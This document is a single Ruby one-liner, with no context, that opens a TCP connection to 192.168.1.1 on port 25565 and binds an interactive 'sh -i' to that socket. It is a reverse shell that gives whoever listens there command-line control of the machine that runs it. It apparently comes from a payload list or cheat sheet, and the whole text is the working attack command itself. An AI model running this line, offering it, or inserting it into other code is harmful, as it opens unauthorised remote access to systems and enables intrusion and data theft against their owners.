ruby -rsocket -e'f=TCPSocket.open("192.168.1.1",25565).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'